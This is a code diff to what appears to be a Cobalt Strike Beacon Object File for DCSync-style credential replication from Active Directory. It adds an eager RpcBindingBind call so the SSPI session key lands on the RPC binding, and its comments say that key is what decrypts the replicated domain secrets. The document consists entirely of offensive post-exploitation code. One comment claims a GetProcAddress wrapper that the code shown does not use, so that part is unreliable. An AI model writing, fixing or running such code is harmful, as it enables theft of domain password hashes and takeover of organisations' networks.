@@ -35,12 +35,18 @@ DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$I_RpcSendReceive(void*);
 DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$I_RpcFreeBuffer(void*);
 DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$I_RpcBindingInqSecurityContext(
     RPC_BINDING_HANDLE, void**);
-/* NOTE: RpcBindingBind was removed — it is undocumented, not exported
- * on older Windows (Server 2008 R2 / XP), and produced spurious
- * RPC_S_UNKNOWN_IF (0x000006e4) when used before the first real call.
- * The first authenticated I_RpcSendReceive (DRSBind) drives the SSPI
- * handshake and populates the security context on the binding handle,
- * which get_session_key reads out afterwards. */
+/* RpcBindingBind is undocumented on MSDN but exported from rpcrt4.dll
+ * on Vista+. It forces the binding to open its transport connection and
+ * complete the SSPI handshake synchronously, attaching the resulting
+ * security context to the binding structure itself — which is the
+ * ONLY way I_RpcBindingInqSecurityContext can return a valid context
+ * on Win8+ RPC (the runtime otherwise pools connections and stashes the
+ * context on the connection object, out of the binding's reach, which
+ * is why the API returned RPC_S_INVALID_BINDING (0x6A6) despite DRSBind
+ * having authenticated successfully). Wrapped with GetProcAddress at
+ * runtime so the module still loads on hosts where it is not exported. */
+DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$RpcBindingBind(
+    void*, RPC_BINDING_HANDLE, void*);
 
 /* ── ntdsapi.dll ── */
 DECLSPEC_IMPORT DWORD WINAPI NTDSAPI$DsBindW(LPCWSTR, LPCWSTR, HANDLE*);
@@ -1396,6 +1402,24 @@ void go(char *args, int args_len)
         BeaconPrintf(CALLBACK_OUTPUT, "[.] trace:   rpcSt=0x%08x\n", rpcSt);
 
         (void)spnLen;
+    }
+    if (rpcSt == 0) {
+        /* Force connection + SSPI handshake now so the security context
+         * lands on the binding object where I_RpcBindingInqSecurityContext
+         * can find it. Without this, the Win8+ RPC runtime keeps the
+         * context on a pooled connection and the inquiry returns 0x6A6.
+         *
+         * A failure here is not fatal for the DRSBind path itself — the
+         * lazy handshake on the first I_RpcSendReceive still works —
+         * but if this returns 0 we get the session key; if it returns
+         * non-zero we lose only decryption, not the RPC call. */
+        BeaconPrintf(CALLBACK_OUTPUT,
+            "[.] trace: RpcBindingBind (force SSPI context onto binding)\n");
+        RPC_STATUS bs = RPCRT4$RpcBindingBind(NULL, hRpc, (void*)&g_drsuapi_if);
+        BeaconPrintf(CALLBACK_OUTPUT, "[.] trace:   bs=0x%08x\n", bs);
+        /* Do NOT propagate bs into rpcSt — we still want to try DRSBind
+         * even if the eager bind failed. Session key may still be
+         * populated after the first successful RPC call. */
     }
     if (rpcSt) {
         BeaconPrintf(CALLBACK_ERROR,
